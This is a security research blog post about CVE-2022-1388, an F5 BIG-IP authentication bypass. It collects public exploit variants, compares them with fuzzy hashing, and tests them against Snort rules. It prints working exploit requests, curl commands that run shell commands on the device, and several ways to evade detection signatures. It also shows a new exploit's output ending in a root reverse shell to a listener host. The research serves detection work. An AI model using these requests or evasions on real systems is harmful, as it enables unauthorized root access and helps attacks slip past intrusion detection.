---
title: "Finding Something New About CVE-2022-1388 - Blog - VulnCheck"
date: 2023-04-13T00:00:00.000Z
draft: false
type: posts
categories: 
- 
---
# Finding Something New About CVE-2022-1388 - Blog - VulnCheck

<br/>

<br/>
One of the things we do at VulnCheck is \[n-day\](https://www.darkreading.com/vulnerabilities-threats/the-overlooked-problem-of-n-day-vulnerabilities) analysis. That can include analysis of well-known, deeply researched, and widely exploited vulnerabilities. When we tackle that type of issue, we aim to learn something new, novel, or, at the very least, interesting. We recently took that approach analyzing \[CVE-2022-1388\](https://nvd.nist.gov/vuln/detail/CVE-2022-1388).\\n\\nCVE-2022-1388 is an authentication bypass vulnerability affecting F5 Big-IP products. When CVE-2022-1388 was disclosed in May 2022, there were only a \[few thousand internet-facing affected systems\](https://trends.shodan.io/search?query=http.title%3A%22BIG-IP%26reg%3B-Redirect%22+%2B%22Server%22¬Æ%3B-+Redirect%22++%22Server%22=#facet/overview). But there was no stopping the infosec hype train. Multiple research organizations published \[redacted\](https://twitter.com/vcslab/status/1523259088259346432) \[proof of concepts\](https://twitter.com/ptswarm/status/1522873828896034816), \[Kevin Beaumont\](https://web.archive.org/web/20220513035505/https://twitter.com/GossiTheDog/status/1521964444380708865) was tweeting about honeypot exploitation, randoms were dropping exploit \[screenshots\](https://web.archive.org/web/20220509072529/https://twitter.com/AnnaViolet20/status/1523564632140509184), and reporters were \[mistaking jokes about an inside job\](https://www.youtube.com/watch?v=1IChiQZM7EY&t=105s) for reality. Eventually, most of the speculation and fear-mongering were put to bed by an excellent deep-dive analysis from \[Horizon3.ai\](https://www.horizon3.ai/f5-icontrol-rest-endpoint-authentication-bypass-technical-deep-dive/). \\n\\nWhen all the hype died down, the vulnerability was quite well-known. It‚Äôs been featured in research write-ups. There‚Äôs a Metasploit \[module\](https://github.com/rapid7/metasploit-framework/blob/fef3796d43f851d286f1909c6021c19fa7c449d4/modules/exploits/linux/http/f5\_icontrol\_rce.rb#L34), and \[Greynoise\](https://viz.greynoise.io/query/?gnql=tags%3A%22F5%20BIG-IP%20iControl%20REST%20Authentication%20Bypass%22) tag. \[Shadow Server\](https://dashboard.shadowserver.org/statistics/honeypot/monitoring/vulnerability/?category=monitoring&statistic=unique\_ips&iot=No&cisa\_kev=yes) identifies the vulnerability in their honeypot network. It was even named one of the \[top vulnerabilities in \[2022\](https://www.infosecurity-magazine.com/blogs/top-security-vulnerabilities/), and added to the \[CISA KEV Catalog\](https://www.cisa.gov/known-exploited-vulnerabilities-catalog). What more could be said about this vulnerability?\\n\\nWell, if you don‚Äôt look, you‚Äôll never know.\\n\\n## Exploit Summarization\\n\\nBefore we go off on our hunt, it‚Äôs useful to know what a standard CVE-2022-1388 exploit looks like. Horizon3.ai‚Äôs technical write-up provides the following four elements (verbatim) that are required to exploit CVE-2022-1388:\\n\\n> 1. Connection header must include X-F5-Auth-Token\\n> 2. X-F5-Auth-Token header must be present\\n> 3. Host header must be localhost / 127.0.0.1 or the Connection header must include X-Forwarded-Host\\n> 4. Auth header must be set with the admin username and any password\\n\\nThe four bullet points describe \*the authentication bypass\*. Additionally, Horizon3.ai pointed out an HTTP endpoint that would allow attackers, after they exploited CVE-2022-1388, to execute arbitrary commands. That endpoint was \`/mgmt/tm/util/bash\`. Horizon3.ai also offered the following HTTP request as a proof of concept (this will execute the Linux command \`id\` on the remote target):\\n\\n\`\`\`sh\\nPOST /mgmt/tm/util/bash HTTP/1.1\\nHost: 127.0.0.1\\nAuthorization: Basic YWRtaW46aG9yaXpvbjM=\\nX-F5-Auth-Token: asdf\\nUser-Agent: curl/7.82.0\\nConnection: X-F5-Auth-Token\\nAccept: \*/\*\\nContent-Length: 39\\n{‚Äúcommand‚Äù:‚Äùrun‚Äù,‚ÄùutilCmdArgs‚Äù:‚Äù-c id‚Äù}\\n\`\`\`\\n\\nThat‚Äôs the basis of exploitation and what a generic CVE-2022-1388 exploit looks like on the wire. Our goal for this n-day analysis is to iterate on public knowledge and find something new and/or interesting to say.\\n\\n## Open Source Detections\\n\\nA good place to start on this sort of task is collecting open-source exploit detections. Detections often summarize the heart of the problem in an easily digestible signature. Additionally, we can determine if we‚Äôre on an interesting path of inquiry by comparing the detections against any new exploits we devise. If all else fails (e.g. we can‚Äôt find any new or interesting exploitation techniques), finding a weakness in a commonly used signature is an interesting little tidbit to share with customers.\\n\\nWe are aware of five open-source Snort 2.9 signatures for CVE-2022-1388. Three in the \[Proofpoint Emerging Threats Rules\](https://rules.emergingthreats.net/open/) (although we‚Äôll only discuss one because they are all tightly linked), and two in the \[Snort Community Ruleset\](https://www.snort.org/faq/what-are-community-rules). The rules, modified for readability and with some of the metadata stripped for brevity, follow.\\n\\nEmerging Threats Snort 2.9 Signature ID 2036556:\\n\`\`\`py\\nalert tcp any any -> $HOME\_NET $HTTP\_PORTS (msg:"ET EXPLOIT F5 BIG-IP iControl REST authentication bypass attempt (CVE-2022-1388) M2"; \\\\n flow:established,to\_server; \\\\n content:!"GET"; http\_method; \\\\n content:"/mgmt/tm"; http\_uri; depth:8; \\\\n content:"Authorization|3a 20|Basic YWRtaW46"; http\_header; \\\\n content:"x-F5-Auth-Token"; http\_header; nocase; \\\\n pcre:"/^Connection\\x3a\\x20\[^\\r\\n\]+x-F5-Auth-Token/Hmi"; \\\\n content:!"Referer|3a 20|"; http\_header; \\\\n content:"X-F5-Auth-Token|3a 20|"; fast\_pattern; http\_header; \\\\n classtype:trojan-activity; sid:2036556; rev:2;)\\n\`\`\`\\n\\nSnort 2.9 Community Signature ID 57336 (commented out by default):\\n\`\`\`py\\nalert tcp $EXTERNAL\_NET any -> $HOME\_NET $HTTP\_PORTS (msg:"POLICY-OTHER F5 iControl REST interface tm.util.bash invocation attempt"; \\\\n flow:to\_server,established;\\n content:"/mgmt/tm/util/bash"; fast\_pattern:only; http\_uri;\\n content:"command"; nocase; http\_client\_body;\\n classtype:policy-violation; sid:57336; rev:3;)\\n\`\`\`\\n\\nSnort 2.9 Community Signature ID 59735:\\n\`\`\`py\\nalert tcp $EXTERNAL\_NET any -> $HOME\_NET $HTTP\_PORTS (msg:"SERVER-WEBAPP F5 BIG-IP iControl remote code execution attempt"; \\\\n flow:to\_server,established; \\\\n content:"Connection:"; nocase; http\_header; \\\\n content:"X-F5-Auth"; distance:0; fast\_pattern; nocase; http\_header; \\\\n pcre:"/^Connection:\[^\\r\\n\]\*?X-F5-Auth/Him";\\n reference:cve,2022-1388; classtype:attempted-user; sid:59735; rev:2;)\\n\`\`\`\\n\\nAll three Snort rules detect Horizon3.ai‚Äôs proof of concept HTTP request, so that‚Äôs a great start for all parties. Let‚Äôs see if we can find something that these signatures won‚Äôt detect.\\n\\n## Exploit Variants\\n\\nIt‚Äôs tempting to load up a Java decompiler and start looking at the F5 BIG-IP management REST API ourselves, but that‚Äôs a bit premature. This vulnerability is approaching its first birthday, and many people have already analyzed it. Many of their findings have manifested as proof of concept exploits. A good next step is collecting those exploits and exploring what types of variants already exist in public.\\n\\nFortunately, VulnCheck tracks exploit sources. For the purposes of this blog, let‚Äôs focus on GitHub as the source. VulnCheck has indexed more than 50 non-fork ‚Äúunique‚Äù stand-alone GitHub exploits for CVE-2022-1388. Excluding those that \[don‚Äôt work\](https://raw.githubusercontent.com/iveresk/cve-2022-1388-1veresk/main/cve-2022-1388.sh), we found that CVE-2022-1388 appears to have four exploit variants on GitHub\\n\\n### 1. The Horizon3.ai Variant\\n\\nHorizon3.ai published an exploit on \[GitHub\](https://raw.githubusercontent.com/horizon3ai/CVE-2022-1388/main/CVE-2022-1388.py) that, depending on the attacker provided command, exactly mirrors the proof of concept HTTP request shared in their technical write-up (included above). This variant has all five of the elements suggested by Horizon3.ai:\\n\\nHTTP POST to \`/mgmt/tm/util/bash\`\\nA Host header using \`127.0.0.1\`\\nAn Authorization header using Basic base64(admin:horizon3) (or the password of your choosing)\\nA Connection header that only contains \`X-F5-Auth-Token\`\\nAn X-F5-Auth-Token header that can contain any value.\\n\\nThis is easily reproduced using the following \`curl\` request:\\n\\n\`\`\`sh\\ncurl -kv -H 'Content-Type: application/json' -H "Host: 127.0.0.1" -H 'Connection: X-F5-Auth-Token' -H 'X-F5-Auth-Token: authtoken' -H 'Authorization: Basic YWRtaW468J+mng==' -d '{"command": "run", "utilCmdArgs": "-c id"}' https://10.9.49.191/mgmt/tm/util/bash;\\n> POST /mgmt/tm/util/bash HTTP/1.1\\n> Host: 127.0.0.1\\n> User-Agent: curl/7.68.0\\n> Accept: \*/\*\\n> Content-Type: application/json\\n> Connection: X-F5-Auth-Token\\n> X-F5-Auth-Token: authtoken\\n> Authorization: Basic YWRtaW468J+mng==\\n> Content-Length: 42\\n\`\`\`\\n\\nHorizon3.ai was (and is, in our eyes) the authoritative source on this vulnerability, so it‚Äôs unsurprising to see most GitHub exploits follow this pattern. However, there were a couple of notable subvariants of this approach.\\n\\n1. Exploits that used \`Host: localhost\` instead of \`Host: 127.0.0.1\`. While not actually included in this analysis, the Metasploit module for CVE-2022-1388 falls into this camp. Presumably, an alphanumeric Host field is less suspicious than a non-routable IP.\\n2. Exploits using \`Connection: close, X-F5-Auth-Token\` or \`Connection: keep-alive, X-F5-Authtoken\` instead of just \`Connection: X-F5-Auth-Token\`. We‚Äôre unsure what drove this innovation as none of the cited Snort rules are tripped up by this variation. More than a few exploits used this approach, so we assume it‚Äôs done to satisfy a WAF requirement.\\n\\nIt‚Äôs interesting to note that Emerging Threats Snort 2.9 Rule 2036556 does not detect the original variation, but it will detect the \`Connection: xxxx, X-F5-Auth-Token\` sub-variant (which means it‚Äôll catch Metasploit and \[Nuclei\](https://github.com/projectdiscovery/nuclei-templates/blob/5ffdd65882c35919828210c82321015be6bc439f/cves/2022/CVE-2022-1388.yaml#L46)). The error in 2036556 is a slight mistake in the following regular expression:\\n\\n\`\`\`py\\npcre:"/^Connection\\x3a\\x20\[^\\r\\n\]+x-F5-Auth-Token/Hmi"; \\\\n\`\`\`\\n\\nThe character class \`\[^\\r\\n\]+\` consumes the first \`X\` when the \`Connection\` header only contains \`X-F5-Auth-Token\`. Snort 2.9 Community Rule 59735 has a more accurate version of this regular expression:\\n\\n\`\`\`py\\npcre:"/^Connection:\[^\\r\\n\]\*?X-F5-Auth/Him";\\n\`\`\`\\n\\nJust like that, we already have an interesting tidbit of knowledge. The signature does detect two of the biggest sources for exploitation (Metasploit and Nuclei) , but now we know we can craft a payload that it doesn‚Äôt detect. The other two Snort rules remain problematic however, so let‚Äôs move on to the other exploit variants.\\n\\n\\n### 2. The X-Forwarded-Host Variant\\n\\nThe \`X-Forwarded-Host\` \[variant\](https://raw.githubusercontent.com/jbharucha05/CVE-2022-1388/main/CVE-2022-1388.sh) was suggested by Horizon3.ai in their technical write-up, but they didn‚Äôt use this approach in their published exploits. An exploit for CVE-2022-1388 doesn‚Äôt need to use \`Host: localhost\` or \`Host: 127.0.0.1\` if the \`Connection\` header contains \`X-Forwarded-Host\`. Another example:\\n\\n\`\`\`sh\\ncurl -kv -H 'Content-Type: application/json' -H 'Connection: X-F5-Auth-Token, X-Forwarded-Host' -H 'X-F5-Auth-Token: authtoken' -H 'Authorization: Basic YWRtaW468J+mng==' -d '{"command": "run", "utilCmdArgs": "-c id"}' https://10.9.49.191/mgmt/tm/util/bash;\\n> POST /mgmt/tm/util/bash HTTP/1.1\\n> Host: 10.9.49.191\\n> User-Agent: curl/7.68.0\\n> Accept: \*/\*\\n> Content-Type: application/json\\n> Connection: X-F5-Auth-Token, X-Forwarded-Host\\n> X-F5-Auth-Token: authtoken\\n> Authorization: Basic YWRtaW468J+mng==\\n> Content-Length: 42\\n\`\`\`\\n\\nAs suggested previously, a \`Host\` field that doesn‚Äôt match the actual target is really suspicious, so this is likely a smarter variant to use in the wild. However, none of the three Snort rules concern themselves with the \`Host\` header. Apparently, their authors also read the Horizon3.ai write-up. So, while this variant is smart, it‚Äôs not good enough. Let‚Äôs see the next variant.\\n\\n### 3. The ‚ÄúKind of Works‚Äù Variant\\n\\nThere are quite a few \[exploits\](https://raw.githubusercontent.com/alt3kx/CVE-2022-1388\_PoC/main/README.md) that don‚Äôt have the required \`Host: 127.0.0.1\` or \`Host: localhost\` \*\*and\*\* they don‚Äôt use the \`X-Forwarded-Host\` value in the \`Connection\` header. They effectively look like this:\\n\\n\`\`\`sh\\ncurl -kv -H 'Content-Type: application/json' -H 'Connection: X-F5-Auth-Token' -H 'X-F5-Auth-Token: authtoken' -H 'Authorization: Basic YWRtaW468J+mng==' -d '{"command": "run", "utilCmdArgs": "-c id"}' https://10.9.49.191/mgmt/tm/util/bash;\\n> POST /mgmt/tm/util/bash HTTP/1.1\\n> Host: 10.9.49.191\\n> User-Agent: curl/7.68.0\\n> Accept: \*/\*\\n> Content-Type: application/json\\n> Connection: X-F5-Auth-Token\\n> X-F5-Auth-Token: authtoken\\n> Authorization: Basic YWRtaW468J+mng==\\n> Content-Length: 42\\n\`\`\`\\n\\nThis variant doesn‚Äôt work on our test installation (BIG-IP version 16.1.2.1 - December 22, 2021), but many exploits on GitHub that follow this pattern. Originally, we assumed these exploits were broken, but we looked deeper given their volume. We couldn‚Äôt get our hands on an older installation, but we found this \[YouTube video\](https://www.youtube.com/watch?v=bLYAzyBwIV4) demonstrating this variant working on a BIG-IP version from 2019. So, these exploits work, but only on old targets. They ‚Äúkind of work.‚Äù\\n\\nThis is also our first real deviation from Horizon3.ai. Pretty interesting! How and why this variant became popular is a mystery. Perhaps a misunderstanding on the importance of the \`Host\` header. But it doesn‚Äôt matter too much, none of the three Snort rules are fooled by the missing values. So we forge ahead.\\n\\n\\n### 4. Referer Variant\\n\\nThe \[Referer Variant\](https://raw.githubusercontent.com/numanturle/CVE-2022-1388/main/bigip-icontrol-rest-rce.yaml) is only notable because it bypasses one of the Snort signatures. This variant is no different than the original Horizon3.ai variant except there‚Äôs an added \`Referer\` HTTP Header. Again, it‚Äôs unclear what drove this innovation, but we guess that it‚Äôs related to a WAF \[CSRF validation\](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses). On the wire, this variant looks like the following:\\n\\n\`\`\`sh\\ncurl -kv -H 'Content-Type: application/json' -H "Host: localhost" -H "Referer: https://10.9.49.191/" -H 'Connection: X-F5-Auth-Token' -H 'X-F5-Auth-Token: authtoken' -H 'Authorization: Basic YWRtaW468J+mng==' -d '{"command": "run", "utilCmdArgs": "-c id"}' https://10.9.49.191/mgmt/tm/util/bash;\\n> POST /mgmt/tm/util/bash HTTP/1.1\\n> Host: localhost\\n> User-Agent: curl/7.68.0\\n> Accept: \*/\*\\n> Content-Type: application/json\\n> Referer: https://10.9.49.191/\\n> Connection: X-F5-Auth-Token\\n> X-F5-Auth-Token: authtoken\\n> Authorization: Basic YWRtaW468J+mng==\\n> Content-Length: 42\\n\`\`\`\\n\\nThe \`Referer\` header shouldn‚Äôt impact exploitation, but it‚Äôll allow the attacker to bypass the Emerging Threats Snort 2.9 Rule 2036556. The detection was written to ignore any request containing a \`Referer\` header.\\n\\n\`\`\`py\\ncontent:!"Referer|3a 20|"; http\_header; \\\\n\`\`\`\\n\\nTherefore, bypassing the rule is as simple as including an arbitrary \`Referer\` header.\\n\\nThat concludes the variant analysis, and without any original thought whatsoever, we‚Äôve bypassed the first of three Snort rules. But with more than 50 ‚Äúunique‚Äù exploits, how can they all be distilled into four, frankly, very related variations? Let‚Äôs take a deeper look at how these exploits are related.\\n\\n## Comparing GitHub Exploits with SSDeep\\n\\nWhen VulnCheck indexes exploits from GitHub we also store a direct link to the raw exploit code (when possible). For example, the raw link to Horizon3.ai‚Äôs exploit code is \[https://raw.githubusercontent.com/horizon3ai/CVE-2022-1388/main/CVE-2022-1388.py\](https://raw.githubusercontent.com/horizon3ai/CVE-2022-1388/main/CVE-2022-1388.py). With the raw links readily available, it‚Äôs an easy task to apply \[ssdeep\](https://ssdeep-project.github.io/ssdeep/index.html) to each exploit in order to determine which share code.\\n\\n\`ssdeep\`, for those unfamiliar, is a tool that computes a fuzzy hash over a given file. A standard hash, like sha-1 for example, can only tell us if two files are identical. A fuzzy hash can tell us if two files are similar. For example, \`ssdeep\` computes the following hashes for these two exploits:\\n\\n| Hash | File |\\n| --- | --- |\\n|24:ZCGacygxlWejJ9n3xYt8fHN5mWp1rOVL6L0zwC0syV:ZtJygDVjJ9n3xt/N5LDOVL6LMWV|https://raw.githubusercontent.com/horizon3ai/CVE-2022-1388/main/CVE-2022-1388.py|\\n|24:ZCGacygxlWeCfn3xYt8fHN5mWp1rOVL6L0zwC0syv:ZtJygDVCfn3xt/N5LDOVL6LMWv|https://raw.githubusercontent.com/pauloink/CVE-2022-1388/main/CVE-2022-1388.py|\\n\\nThe computed hashes are (slightly) different, but \`ssdeep\` can tell us that they are related (a score higher 0 indicates similarity):\\n\\n\`\`\`python\\nPython 3.8.10 (default, Mar 13 2023, 10:26:41)\\n\[GCC 9.4.0\] on linux\\nType "help", "copyright", "credits" or "license" for more information.\\n>>> import ssdeep\\n>>> ssdeep.compare("24:ZCGacygxlWejJ9n3xYt8fHN5mWp1rOVL6L0zwC0syV:ZtJygDVjJ9n3xt/N5LDOVL6LMWV", "24:ZCGacygxlWeCfn3xYt8fHN5mWp1rOVL6L0zwC0syv:ZtJygDVCfn3xt/N5LDOVL6LMWv")\\n93\\n\`\`\`\\n\\nDiffing these exploits, we see that they are very similar indeed.\\n\\n\`\`\`diff\\ndiff -u CVE-2022-1388.py CVE-2022-1388.py.1\\n--- CVE-2022-1388.py 2023-04-11 14:45:01.329298751 -0400\\n+++ CVE-2022-1388.py.1 2023-04-11 14:45:12.225289447 -0400\\n@@ -8,7 +8,7 @@\\n url = f'https://{target}/mgmt/tm/util/bash'\\n headers = {\\n 'Host': '127.0.0.1',\\n- 'Authorization': 'Basic YWRtaW46aG9yaXpvbjM=',\\n+ 'Authorization': 'Basic YWRtaW46YW55dGhpbmc=',\\n 'X-F5-Auth-Token': 'asdf', \\n 'Connection': 'X-F5-Auth-Token',\\n 'Content-Type': 'application/json'\\n@@ -28,6 +28,4 @@\\n parser.add\_argument('-c', '--command', help='The command to execute')\\n args = parser.parse\_args()\\n \\n- exploit(args.target, args.command)\\n-\\n-\\n+ exploit(args.target, args.command)\\n\`\`\`\\n\\nThe difference between these two ‚Äúunique‚Äù exploits is a slight change in whitespace and a change of the admin user‚Äôs password from ‚Äúhorizon3‚Äù to ‚Äúanything.‚Äù We found a lot of this sort of thing when we analyzed the 50+ GitHub exploits. For example, consider this screenshot that shows five exploits side-by-side.\\n\\n!\[Related Exploits\](/blog/new-cve-2022-1388/related-exploits.png){:width="100%"}\\n\\nOutside of their comments and output formatting, these exploits are nearly identical (two of these are ‚ÄúKind of Works‚Äù variants because they removed the \`Host\` header). A normal hash wouldn‚Äôt have been able to identify whether these exploits were related, but \`ssdeep\` was able to lump them into two groups. Then we were able to connect them afterward (\`ssdeep\` is not necessarily optimal for these small file sizes). Their hashes follow:\\n\\n| Hash | File |\\n| --- | --- |\\n|48:rArpnVOEUlQY0YIQUG+Clu8T26HlCO1dg6LQ3HnczPPuoHzPppkqEpvAZgcU2aAD:sFnkDQY5RhQXUfpKqCQgcU1YVbfp|https://raw.githubusercontent.com/ZephrFish/F5-CVE-2022-1388-Exploit/main/CVE\_2022\_1388.py|\\n|48:krpnVOEUlQY0YIQUGwhGgfT26HlCO1dg6LQ3HnczPPuoHzPppkqEpvAZgcU2aALn:kFnkDQYQRhQXUfpKqCQgcU1YVbfp|https://raw.githubusercontent.com/devengpk/CVE-2022-1388/main/exploit.py|\\n|48:9rpnVO8VCO1dg6LQtnczPPujHzPppkqEpvApgcU2sALslAeKUtxQj4OsZkKClfas:9Fnk2hQtU4pKqCmgcUtMVbfNR|https://raw.githubusercontent.com/thatonesecguy/CVE-2022-1388-Exploit/main/CVE\_2022\_1388.py|\\n|96:UjbFnk+QY09edQXUwzpdVPAMwxSV5gcU12VLizsp:UjbOY08dQXXd9AMOiw2VLizsp|https://raw.githubusercontent.com/bytecaps/CVE-2022-1388-EXP/main/exp.py|\\n|96:8Fnk+QY03epQ/JXNSYdpdVYf/MhdgcU1/VLJlp:8OY0OpQ/JXNSQdSnMhs/VLJlp|https://raw.githubusercontent.com/LinJacck/CVE-2022-1388-EXP/main/CVE-2022-1388.py|\\n\\nThe reality is that there are only four exploit variants of CVE-2022-1388 on GitHub because many of the exploits are mostly copy-and-paste jobs. Unfortunately, for us, that means we need to look elsewhere to discover an interesting or new nugget of information. Let‚Äôs cast about for the next thing.\\n\\n\\n## Hunting on AttackerKB\\n\\nAs a former \[AttackerKB\](https://attackerkb.com/) contributor, this author is biased. I firmly believe Rapid7‚Äôs Technical Analysis‚Äô on AttackerKB is underappreciated. They are a great place to monitor for new exploits. The VulnCheck exploit repository indicates the AttackerKB entry for \[CVE-2022-1388\](https://attackerkb.com/topics/SN5WCzYO7W/cve-2022-1388/rapid7-analysis) has exploits. After reading the AttackerKB analysis, we found this important note (likely attributable to \[Ron Bowes\](https://github.com/rbowes-r7)):\\n\\n>While testing, before we knew about /mgmt/tm/util/bash, we actually devised a much more complicated way to run code: RPM specification injection! We‚Äôll show that method here, because it‚Äôs conceivable that an attacker might use it to evade detection. It‚Äôs also kinda interesting!\\n\\nThe write-up goes on to describe how to use two HTTP endpoints to execute arbitrary commands on the F5 BIG-IP HTTP management interface:\\n\\n1. \`/mgmt/shared/iapp/rpm-spec-creator\` to provide the command(s) to execute\\n2. \`/mgmt/shared/iapp/build-package\` to trigger execution.\\n\\nHowever, the analysis doesn‚Äôt provide a proof of concept exploit that uses the endpoint in conjunction with CVE-2022-1388. Additionally, \[searching GitHub\](https://github.com/search?q=%2Fmgmt%2Fshared%2Fiapp%2Frpm-spec-creator&type=code) for these endpoints doesn‚Äôt yield any results for CVE-2022-1388 (Rapid7 later got this issue fixed as \[CVE-2022-41800\](https://www.rapid7.com/blog/post/2022/11/16/cve-2022-41622-and-cve-2022-41800-fixed-f5-big-ip-and-icontrol-rest-vulnerabilities-and-exposures/) and published their disclosure in November 2022 - the results on GitHub all point to the associated Metasploit module for CVE-2022-41800).\\n\\nEssentially, the AttackerKB analysis told everyone a CVE-2022-1388 exploit variation was possible. But then no one actually published an exploit demonstrating that. We can remedy that, and we are especially excited to do so because this variant will bypass a second Snort rule! Snort 2.9 Community Rule 57336 explicitly looks for the \`bash\` endpoint:\\n\\n\`\`\`py\\ncontent:"/mgmt/tm/util/bash"; fast\_pattern:only; http\_uri;\\n\`\`\`\\n\\nSimilarly, Emerging Threats Snort 2.9 Rule 2036556 is bypassed looks for \`/mgmt/tm/\`:\\n\\n\`\`\`py\\ncontent:"/mgmt/tm"; http\_uri; depth:8;\\n\`\`\`\\n\\nHere we are again, with next to no original thought, we‚Äôve found a second rule bypass and we‚Äôre able to contribute a new exploit variant to the GitHub exploit ecosystem. You can find our new exploit \[here\](https://github.com/j-baines/tippa-my-tongue). The exploit implements two signature bypasses and opts for the \`X-Forward-Host\` variation. Example output:\\n\\n\`\`\`c\\nalbinolobster@mournland:~/tippa-my-tongue$ python3 tippa-my-tongue.py --rhost 10.9.49.191 --lhost 10.9.49.194\\n\\n ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñ™ ‚ñÑ‚ñÑ‚ñÑ¬∑ ‚ñÑ‚ñÑ‚ñÑ¬∑ ‚ñÑ‚ñÑ‚ñÑ¬∑ ‚Ä¢ ‚ñå ‚ñÑ ¬∑. ‚ñÑ¬∑ ‚ñÑ\\n ‚Ä¢‚ñà‚ñà ‚ñà‚ñà ‚ñê‚ñà ‚ñÑ‚ñà‚ñê‚ñà ‚ñÑ‚ñà‚ñê‚ñà ‚ñÄ‚ñà ¬∑‚ñà‚ñà ‚ñê‚ñà‚ñà‚ñà‚ñ™‚ñê‚ñà‚ñ™‚ñà‚ñà\\n ‚ñê‚ñà.‚ñ™‚ñê‚ñà¬∑ ‚ñà‚ñà‚ñÄ¬∑ ‚ñà‚ñà‚ñÄ¬∑‚ñÑ‚ñà‚ñÄ‚ñÄ‚ñà ‚ñê‚ñà ‚ñå‚ñê‚ñå‚ñê‚ñà¬∑‚ñê‚ñà‚ñå‚ñê‚ñà‚ñ™\\n ‚ñê‚ñà‚ñå¬∑‚ñê‚ñà‚ñå‚ñê‚ñà‚ñ™¬∑‚Ä¢‚ñê‚ñà‚ñ™¬∑‚Ä¢‚ñê‚ñà ‚ñ™‚ñê‚ñå ‚ñà‚ñà ‚ñà‚ñà‚ñå‚ñê‚ñà‚ñå ‚ñê‚ñà‚ñÄ¬∑.\\n ‚ñÄ‚ñÄ‚ñÄ ‚ñÄ‚ñÄ‚ñÄ.‚ñÄ .‚ñÄ ‚ñÄ ‚ñÄ ‚ñÄ‚ñÄ ‚ñà‚ñ™‚ñÄ‚ñÄ‚ñÄ ‚ñÄ ‚Ä¢ \\n ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ ‚ñê ‚ñÑ ‚ñÑ‚ñÑ ‚Ä¢ ‚ñÑ‚Ä¢ ‚ñÑ‚ñå‚ñÑ‚ñÑ‚ñÑ . \\n ‚Ä¢‚ñà‚ñà ‚ñ™ ‚Ä¢‚ñà‚ñå‚ñê‚ñà‚ñê‚ñà ‚ñÄ ‚ñ™‚ñà‚ñ™‚ñà‚ñà‚ñå‚ñÄ‚ñÑ.‚ñÄ¬∑ \\n ‚ñê‚ñà.‚ñ™ ‚ñÑ‚ñà‚ñÄ‚ñÑ ‚ñê‚ñà‚ñê‚ñê‚ñå‚ñÑ‚ñà ‚ñÄ‚ñà‚ñÑ‚ñà‚ñå‚ñê‚ñà‚ñå‚ñê‚ñÄ‚ñÄ‚ñ™‚ñÑ \\n ‚ñê‚ñà‚ñå¬∑‚ñê‚ñà‚ñå.‚ñê‚ñå‚ñà‚ñà‚ñê‚ñà‚ñå‚ñê‚ñà‚ñÑ‚ñ™‚ñê‚ñà‚ñê‚ñà‚ñÑ‚ñà‚ñå‚ñê‚ñà‚ñÑ‚ñÑ‚ñå \\n ‚ñÄ‚ñÄ‚ñÄ ‚ñÄ‚ñà‚ñÑ‚ñÄ‚ñ™‚ñÄ‚ñÄ ‚ñà‚ñ™¬∑‚ñÄ‚ñÄ‚ñÄ‚ñÄ ‚ñÄ‚ñÄ‚ñÄ ‚ñÄ‚ñÄ‚ñÄ \\n\\n CVE-2022-1388 \\n CVE-2022-41800 \\n\\n ü¶û \\n\\n\[+\] Executing netcat listener\\n\[+\] Using /usr/bin/nc\\nListening on 0.0.0.0 1270\\n\[+\] Sending initial request to rpm-spec-creator\\n\[+\] Sending exploit attempt request to build-package\\nConnection received on 10.9.49.191 47152\\nbash: no job control in this shell\\n\[@localhost:NO LICENSE:Standalone\] BUILD # pwd\\npwd\\n/var/config/rest/node/tmp/BUILD\\n\[@localhost:NO LICENSE:Standalone\] BUILD # id\\nid\\nuid=0(root) gid=0(root) groups=0(root) context=system\_u:system\_r:initrc\_t:s0\\n\[@localhost:NO LICENSE:Standalone\] BUILD #\\n\`\`\`\\n\\n## Out of Luck\\n\\nWe‚Äôve gathered variant ideas from GitHub. We‚Äôve pilfered a new exploit endpoint from a better researcher. We‚Äôve written a new exploit and bypassed two Snort rules, but there is still one more Snort rule we haven‚Äôt bypassed. Snort 2.9 Community Rule 59735:\\n\\n\`\`\`py\\nalert tcp $EXTERNAL\_NET any -> $HOME\_NET $HTTP\_PORTS (msg:"SERVER-WEBAPP F5 BIG-IP iControl remote code execution attempt"; \\\\n flow:to\_server,established; \\\\n content:"Connection:"; nocase; http\_header; \\\\n content:"X-F5-Auth"; distance:0; fast\_pattern; nocase; http\_header; \\\\n pcre:"/^Connection:\[^\\r\\n\]\*?X-F5-Auth/Him";\\n reference:cve,2022-1388; classtype:attempted-user; sid:59735; rev:2;)\\n\`\`\`\\n\\nThe problem is this: Snort Community Rule 59735 does an excellent job of catching a single minimum requirement for exploitation. At the end of the day, exploitation will always require a \`Connection\` header that contains \`X-F5-Auth‚Ä¶\`. It might not be the most performant rule (requires searching the entire HTTP header). It might be prone to false positives (particularly of other exploits). But after rooting around the F5 jar files for a possible normalization bypass, I‚Äôll be damned if we can bypass this one. So hats off to you, Snort Community member! You‚Äôve bested us this time!\\n\\nBut that‚Äôs not to say 59735 is the best Snort rule for this vulnerability. Or even a good Snort rule at all. It‚Äôs not especially good for performance reasons and really not good for the potential for false positives. For my money, the Emerging Threats signature is the best rule. If they update the rule to drop the \`Referer\` logic, adjust the \`http\_uri\`, and fix the \`Connection\` regular expression then it will likely be the most performant and most accurate.\\n\\n## Conclusion\\n\\nWe explored open-source intelligence surrounding CVE-2022-1388. This vulnerability has been examined from every angle over the last year, but we thought we might be able to squeeze out one more interesting tidbit. In this blog, we detailed the exploit variants on GitHub, we found a few network signature bypasses, and we published a new exploit variant. All that was achievable \*only\* using open-source intelligence. Vulnerability analysis, Vulnerability intelligence - they aren‚Äôt always done with a debugger. Sometimes it‚Äôs just picking up where others have left off, and iterating.\\n\\nDo you like GitHub exploits too? To get access to our collection of GitHub exploits, register for a VulnCheck account today by loading https://vulncheck.com and clicking ‚ÄúRegister‚Äù.\\n

#### [Source](https://vulncheck.com/blog/new-cve-2022-1388)

<br/>
---
